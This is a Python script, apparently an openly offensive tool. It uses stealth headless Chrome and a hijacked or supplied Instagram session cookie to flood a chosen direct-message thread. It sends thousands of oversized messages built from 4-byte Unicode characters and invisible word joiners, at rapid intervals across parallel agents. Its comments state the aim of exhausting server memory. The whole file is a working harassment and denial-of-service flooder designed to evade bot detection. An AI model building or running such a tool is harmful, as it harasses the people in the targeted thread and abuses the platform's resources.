# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (RESOURCE-CRUSHER V38)
# 📅 STATUS: RAM-SATURATION | 4-AGENT TOTAL | AWS-IOPS-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.05)  # 🔥 EXTREME VELOCITY
REST_AFTER_STRIKES = 250    # Long bursts to fill the AWS buffer
REST_DURATION = 2          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_resource_crusher_payload():
    """Generates a high-byte payload to saturate AWS RAM and Network IO."""
    u_id = random.randint(1000, 9999)
    # Using 'Mathematical Alphanumeric Symbols' (4 bytes per char)
    # This doubles the memory load compared to standard English.
    heavy_char = "𝕻" 
    glue = "\u2060" # Word Joiner to prevent the server from breaking the string
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STRIKE_ID:{u_id}]"
    
    body = []
    # Maximum character limit (10,000 bytes)
    for i in range(420):
        # We create long 'Unbreakable' chains of 4-byte characters
        # This forces the AWS memory pool to allocate 'Large Object Heap' chunks
        line = f"PRAVEER_PAPA_ON_TOP_🌙_{heavy_char * 15}_{i}{glue}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # We target the JS memory heap directly
        chrome_options.add_argument("--js-flags='--max-old-space-size=4096'") 
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(10) # Fast sync
            
            while True:
                payload = get_resource_crusher_payload()
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    # Using direct 'execCommand' for zero-lag injection from your side
                    driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
                    box.send_keys(Keys.ENTER)
                    
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Resource Strike ({GLOBAL_SENT})")
                except:
                    break 

                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
